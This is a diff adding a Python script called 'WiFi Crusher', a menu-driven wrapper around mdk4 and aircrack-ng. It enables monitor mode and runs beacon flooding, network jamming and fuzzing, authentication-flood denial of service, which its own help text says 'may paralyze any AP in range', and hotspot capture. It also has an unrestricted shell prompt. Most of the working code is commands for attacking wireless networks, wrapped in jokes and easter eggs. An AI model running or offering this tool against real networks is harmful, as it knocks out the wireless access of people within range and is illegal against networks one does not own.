@@ -1,0 +1,246 @@
+#!/usr/bin/python3.7
+import os
+import string
+import time
+import random
+import string
+import subprocess
+import sys
+from getpass import getpass
+import webbrowser
+
+chars = string.ascii_letters + string.digits + '!@#$%^*()'
+random.seed(os.urandom(1024))
+ByeList = ["Poka", "Sayonara", "Adios", "Goodbye", "Hasta La Vista", "Alividercci", "Do pobachennya", "Auf Wiedersehen", "Zaijian"]
+random_stream = ["https://soundcloud.com/uamee", "https://soundcloud.com/djblyatman", "https://soundcloud.com/gopnikmcblyat"]
+clear = "clear"
+QuoteList = ["Ok, so what? Is that all? No, I think I screwed your WiFi :3 See ya later :D", "Don't attempt to use it on another person's WiFi, cuz' it's really illegal and stupid", "GNU comes with ABSOLUTLEY NO WARRANTY, to the extent pemitted by applicable law.", "Use your electronics smartly, so you won't get to jail for that thing :D", "I don't think that WiFi Crusher won't kill my WiFi, but I don't think so!", "This is really pity, don't you think?", "i aM gOInG t0 h4Ck Ur Internet(typical script kiddie)", "I suggest use this tool to troll Tech Support scammers)", "Try poking around, see if you find something.", "I tried making my own tool, but I made an overlay for MDK4.", "Simply put, code for MAC addresses doesn't work.", "Thank you, aircrack-ng team for making fantastic tools. I wrote WiFi Crusher in two weeks.", "Hey, stop the music, or I'll kill your WiFi!"]
+mac_list = ["A", "B", "C", "D", "E", "F"]
+def main():
+	os.system("airmon-ng start wlan0")
+	os.system(clear)
+	menu()
+	choice_logic()
+
+def menu():
+	os.system(clear)
+	print(random.choice(QuoteList) + """ 
+                  ____     ____  _          ___          ___  _
+      |  /|  / / /     /  /     / |  /   / /     /   /  /    / |
+      | / | / / /---- /  /     /--- /   / /__   /---/  /--- /---
+      |/  |/ / /     /  /___  /  | /___/  ___/ /   /  /___ /|
+                                v1.0 
+   	https://github.com/inquisition-musician/wifi_crusher
+   	    https://github.com/aircrack-ng/aircrack-ng
+   	       https://github.com/aircrack-ng/mdk4
+
+   	       [1]WiFi Spammer
+   	       [2]WiFi Jammer
+   	       [3]Dump of the hotspots
+   	       [4]Authentication DoS
+               [99]Exit
+               [R]Reload
+               [C]Clear screen with no menu
+               [D]Disable monitoring mode
+               [E]Re-enable monitoring mode
+               [I]Interface Configuration(ifconfig)
+               [S]Shell.
+               [A]About the tool
+""")
+def choice_logic():
+	choice = input("wfcrshr> ")
+	if choice == "1":
+		wifi_spammer()
+	elif choice == "2":
+		wifi_jammer()
+	elif choice == "3":
+		os.system("airodump-ng wlan0mon")
+		choice_logic()
+	elif choice == "4":
+		authdos()
+		choice_logic()
+	elif choice == "99":
+		exit_state()
+	elif choice == "r" or choice == "R":
+		menu()
+		choice_logic()
+	elif choice == "c" or choice == "C" or choice == "clear":
+		os.system(clear)
+		choice_logic()
+	elif choice == "d" or choice == "D":
+		os.system("airmon-ng stop wlan0mon")
+		choice_logic()
+	elif choice == "e" or choice == "E":
+		os.system("airmon-ng start wlan0")
+		choice_logic()
+	elif choice == "i" or choice == "I":
+		os.system("ifconfig")
+		choice_logic()
+	elif choice == "a" or choice == "A":
+		about()
+	elif choice == "frdbg":
+		print("OK, this is for debugging purposes.")
+	elif choice == "InitialD" or choice == "initiald" or choice == "initialD" or choice == "Initiald":
+		RunInThe90()
+	elif choice == "bigboobs":
+		boobs()
+	elif choice == "help" or choice == "Help" or choice == "HELP":
+		helpmenu()
+	elif choice == "s" or choice == "S" or choice == "shell":
+		shell()
+		choice_logic()
+	elif choice == "msfconsole":
+		rapid7hello()
+	elif choice == "l" or choice == "fsociety":
+		lscriptandfsociety()
+	else:
+		print("Type 'help' to get instructions, or pick 'R' to reload screen")
+		choice_logic()
+
+def wifi_spammer():
+	os.system("mdk4 wlan0mon b -m -s 500")
+	choice_logic()
+def wifi_jammer():
+	os.system("mdk4 wlan0mon f -s abp -m bmstm -p 4000")
+	choice_logic()
+def exit_state():
+	os.system(clear)
+	print(random.choice(ByeList) + "!")
+	exit()
+def about():
+	os.system(clear)
+	print("""About the tool.
+
+WiFi Crusher is the tool that allows to make random access points, using MDK4 and aircrack-ng, as an API 
+to make WiFi monitors confuse. It also allows to fuzz your WiFi network. This will be fixed in the newer 
+versions. Stay tuned. One of the quotes suggest you to use to troll TS scammers. Well, you can actually 
+troll them telling that it's a virus(if your host is Linux and you have second WiFi adapter plugged in.)
+
+Sincerely.
+inquisition-musician(i hAvE tHAt NICKnaME!! gIVe IT back u sTiLEr!)
+""")
+	choice = getpass("Press any key to continue! ")
+	if choice == "frdbg":
+		print("OK, this is for debugging purposes.")
+	else:
+		menu()
+		choice_logic()
+def RunInThe90():
+	os.system(clear)
+	print("""Running in the nineties. It's a new way I like to be.
+I'm just running in the nineties. Come on, baby, run 
+to me! We are running in the nineties. Is a new way
+to set me free. I'm just running in the nineties.
+Yes, I wanna know, yes, I wanna see.
+
+Addressed to my girlfriend. You can google this. 
+Funnily enough, you found this easter egg.
+
+""")
+	choice = getpass("Press and enter any key to continue! ")
+	if choice == "frdbg":
+		print("OK, this is for debugging purposes.")
+	else:
+		menu()
+		choice_logic()
+
+def helpmenu():
+	print("""
+Commands for WiFi Crusher. 
+ ==============================================================
+|[1] - WiFi Spammer     | For confusing WiFi monitors.         |
+|[2] - WiFi Jammer      | For jamming (fuzzing) WiFi networks. |
+|[3] - Dump of AP's     | Simple airodump-ng with interface.   |
+|[4] - Authentication   | Spamming authentication packets.     |
+|      DoS              | (Warning! It may paralyze any AP in  |
+|                       | range of your location!)             |
+|[99] - Exit            | Exit. Simple enough.                 |
+|[R] - Reload menu      | For reloading menu.                  |
+|[C] - Clear screen     | For clearing the screen.             |
+|[D] - Disable monitor  | As described in the title.           |
+|      mode.            |                                      |
+|[E] - Enable monitor   | OK, Auto-enable doesn't work         |
+|      mode             |                                      |
+|[I] - ifconfig         | Interface Configuration.             |
+|[A] - About            | Shows 'About' screen                 |
+|[s] or shell - little  | Description explains all             |
+|               shell   | itself                               |
+ ==============================================================
+Take a look at the code, find some easter eggs) Funny, as it's 
+sounds, but it's GNU, it's free to take a look under the hood.
+
+""")
+	choice_logic()
+
+def boobs():
+	print(""" （•_ㅅ_•） 
+		""")
+	choice = getpass("Press and enter any key to continue! ")
+	if choice == "frdbg":
+		print("OK, this is for debugging purposes.")
+	else:
+		choice_logic()
+
+def authdos():
+	os.system("mdk4 wlan0mon a -m -s 1000")
+
+def shell():
+	shell_commands = input("$ ")
+	os.system(shell_commands)
+	if shell_commands == "exit":
+		choice_logic()
+	shell()
+	choice_logic()
+
+def rapid7hello():
+	print("""Shout-out to Rapid7 for inspiring me to make a metasploit-framework-
+like interface for MDK4 and aircrack-ng. It's actually sad that andrax developer 
+got killed. It was simple to install, opposed to Kali-Nethunter, since not all 
+devices has a capability to run Kali-Nethunter. Press F to pay respects.
+
+Regards.
+inquisition-musician.
+""")
+	choice = getpass("Press and enter any key to continue! ")
+	if choice == "frdbg":
+		print("OK, this is for debugging purposes.")
+	elif choice == "f" or choice == "F":
+		print("Farewell.(")
+	else:
+		choice_logic()
+	choice_logic()
+
+def lscriptandfsociety():
+	print("""Shout-out to Manisso and Arios Mela Chronios for another inspiration for making this tool. 
+I used your python and shell scripts back, when I was a green Linux user, using Termux. 
+I want to thank you for that. Be safe, and don't use ATM's with skimmers. 
+
+Sincerely.
+inquisition-musician.
+""")
+	choice_logic()
+
+def checkdep():
+	if os.path.isfile("/usr/bin/aircrack-ng") and os.path.isfile("/usr/sbin/mdk4") == True:
+		main()
+	elif os.path.isfile("/usr/sbin/mdk4") == False:
+		install = input("Would you like to install MDK4?[Y/n] ")
+		if install == "y" or install == "Y":
+			os.system("apt-get install mdk4")
+		if install == "n" or install == "N":
+			exit()
+	elif os.path.isfile("/usr/bin/aircrack-ng") == False:
+		install_air = input("Would you like to install aircrack-ng?[Y/n] ")
+		if install_air == "y" or install_air == "Y":
+			os.system("apt-get install aircrack-ng")
+		elif install_air == "n" or install_air == "n":
+			exit()
+	else:
+		print("Installing dependencies...")
+		time.sleep(2)
+		os.system("apt-get install aircrack-ng && apt-get install mdk4")
+		menu()
+		choice_logic()
+
+checkdep()
+main()
